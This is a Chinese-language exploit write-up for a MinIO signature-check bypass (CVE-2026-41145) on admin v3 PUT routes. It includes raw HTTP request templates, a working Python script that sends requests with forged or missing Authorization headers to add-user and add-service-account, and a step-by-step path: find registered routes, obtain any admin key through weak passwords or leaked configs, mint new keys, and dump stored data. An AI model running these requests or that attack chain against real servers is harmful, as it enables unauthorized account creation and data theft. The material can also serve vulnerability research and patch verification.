# MinIO admin v3 PUT 路由被 CVE-2026-41145 绕过（无 Authorization 头也到达 handler）

## 结论

`STREAMING-UNSIGNED-PAYLOAD-TRAILER` 的免签分支**不只作用于对象面**：MinIO 管理面
`/minio/admin/v3/*` 的 **PUT** 路由同样整段跳过 SigV4 校验，连 Credential 里的 AK 是否存在都不校验——
把 `Authorization` 头整段删掉，请求仍被送进 admin handler。

判据是响应码的**归属**，不是"能不能读到数据"：

| 形态 | 回显 | 含义 |
|---|---|---|
| `GET` 同路径 | `403 SignatureDoesNotMatch` | 停在签名层，未进 handler |
| `POST` 同路径（裸体） | `426 XMinioAdminVersionMismatch` | 进了 handler，但该形态/版本不符 |
| `PUT` + 普通签名 + 随机 secret | `403 SignatureDoesNotMatch` | 阴性对照 |
| `PUT` + streaming 头 + 随机 secret | `403 {"Code":"AccessDenied","Resource":"/minio/admin/v3/..."}` | **绕过成立**，进 handler 后被身份闸拦 |
| 同上，Credential 换不存在 AK | 仍 `AccessDenied`（正常模式应为 `InvalidAccessKeyId`） | AK 存在性校验也被跳过 |
| 同上，**删除整个 Authorization 头** | 仍同一 `AccessDenied` | **决定性证据：无需任何凭据** |

`AccessDenied` 来自 admin handler 的身份判定，**不等于可未授权操作**。

## 前置条件

1. 目标是 MinIO 的 S3 端口（`Server: MinIO`）。
2. 版本 `< RELEASE.2026-04-11T03-20-12Z`。
3. 请求必须是**带体 PUT** + `Content-Encoding: aws-chunked` 分帧 + `x-amz-checksum-crc32` trailer
   （`Content-Length` 或 `Transfer-Encoding: chunked` 均可）；GET 不走该分支。
4. 目标上该 admin 路由已注册（`mode-server-xl-single` 等部署模式下多数路由未注册，直接 426）。

## 原始请求模板

基线（阴性）：

```http
PUT /minio/admin/v3/add-service-account HTTP/1.1
Host: <HOST>:9000
x-amz-date: <ts>
x-amz-content-sha256: <sha256(body)>
Authorization: AWS4-HMAC-SHA256 Credential=<AK>/<date>/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-content-sha256;x-amz-date, Signature=<随机 secret 算出的错误签名>
Content-Length: <len(body)>

{"policy":""}
```

阳性（流式，`Authorization` 可整段删掉）：

```http
PUT /minio/admin/v3/add-service-account HTTP/1.1
Host: <HOST>:9000
x-amz-date: <ts>
x-amz-content-sha256: STREAMING-UNSIGNED-PAYLOAD-TRAILER
x-amz-decoded-content-length: 13
Content-Encoding: aws-chunked
Content-Length: <len(framed)>

d\r\n{"policy":""}\r\n0\r\nx-amz-checksum-crc32:<base64(crc32(body))>\r\n\r\n
```

同类路由：`PUT /minio/admin/v3/add-user?accessKey=<name>`，体为 16 字节随机口令。

## 复现脚本（python3，直连）

```python
import http.client, hashlib, hmac, base64, zlib, datetime, random, time

HOST, PORT = '192.0.2.15', 9000
REGION, SERVICE = 'us-east-1', 's3'
ts = datetime.datetime.utcnow().strftime('%Y%m%dT%H%M%SZ')
stamp = ts[:8]

def fake_auth(method, path, ak):
    sk = ''.join(random.choice('abcdef0123456789') for _ in range(32))
    h = {'host': f'{HOST}:{PORT}', 'x-amz-date': ts,
         'x-amz-content-sha256': 'STREAMING-UNSIGNED-PAYLOAD-TRAILER'}
    sh = ';'.join(sorted(h))
    ch = ''.join(f'{k}:{h[k]}\n' for k in sorted(h))
    cr = '\n'.join([method, path, '', ch, sh, 'STREAMING-UNSIGNED-PAYLOAD-TRAILER'])
    scope = f'{stamp}/{REGION}/{SERVICE}/aws4_request'
    sts = '\n'.join(['AWS4-HMAC-SHA256', ts, scope, hashlib.sha256(cr.encode()).hexdigest()])
    k = ('AWS4' + sk).encode()
    for m in (stamp, REGION, SERVICE, 'aws4_request'):
        k = hmac.new(k, m.encode(), hashlib.sha256).digest()
    return (f'AWS4-HMAC-SHA256 Credential={ak}/{scope}, SignedHeaders={sh}, '
            'Signature=' + hmac.new(k, sts.encode(), hashlib.sha256).hexdigest())

def chunked(body):
    crc = base64.b64encode(zlib.crc32(body).to_bytes(4, 'big')).decode()
    return (f'{len(body):x}\r\n'.encode() + body + b'\r\n0\r\n'
            + f'x-amz-checksum-crc32:{crc}\r\n'.encode() + b'\r\n')

def send(method, path, body, ak=None):
    framed = chunked(body)
    h = {'x-amz-date': ts,
         'x-amz-content-sha256': 'STREAMING-UNSIGNED-PAYLOAD-TRAILER',
         'x-amz-decoded-content-length': str(len(body)),
         'Content-Encoding': 'aws-chunked',
         'Content-Length': str(len(framed))}
    if ak:
        h['Authorization'] = fake_auth(method, path, ak)
    c = http.client.HTTPConnection(HOST, PORT, timeout=10)
    c.request(method, path, body=framed, headers=h)
    r = c.getresponse(); d = r.read(); c.close()
    print(method, path, 'ak=', ak, '->', r.status, d[:200])

P = '/minio/admin/v3/add-service-account'
send('PUT', P, b'{"policy":""}', 'artxnosuchak')   # 期望 403 AccessDenied
send('PUT', P, b'{"policy":""}')                   # 期望 403 AccessDenied（无 Authorization）
send('PUT', '/minio/admin/v3/add-user?accessKey=artxprobe',
     b'artxprobe123456', 'artxnosuchak')           # 期望 403 AccessDenied
```

`/minio/admin/v3/add-user?accessKey=` 无论带不带 Authorization 都回同一
`{"Code":"AccessDenied","Resource":"/minio/admin/v3/add-user"}` —— 即签名与 AK 存在性均未参与。

## 落地路径

绕过只把人送到 handler，身份闸仍在。要真正操作：

1. 先扫出**已注册**的 admin 路由（`AccessDenied` vs `426` 分开记），未注册的一律 426；
2. 拿到任意一个具备 admin 权限的 AK（9001 登录 oracle / 弱口令 / 泄露配置），同一请求只把
   Credential 换成真 AK、secret 仍可随机填，直接落到 `add-user` / `add-service-account`；
3. 免签下发新 AK 后回到对象面拖库（对象面同款绕过见
   `minio-streaming-unsigned-payload-trailer-sigv4-bypass-cve-20`）。

## 常见失败原因

- 使用 GET/HEAD —— 不走该分支，恒 `SignatureDoesNotMatch`；
- 体没做 aws-chunked 分帧，或漏 `Content-Encoding` / `x-amz-decoded-content-length` / crc32 trailer；
- 把 `AccessDenied` 误判成"未授权可用"：它只证明到了 handler；
- 在未注册路由上反复打，看到 426 就以为绕过失效；
- 目标是 S3 兼容网关（Ceph/OSS/s3proxy）而非 MinIO 本体，行为可能不同。
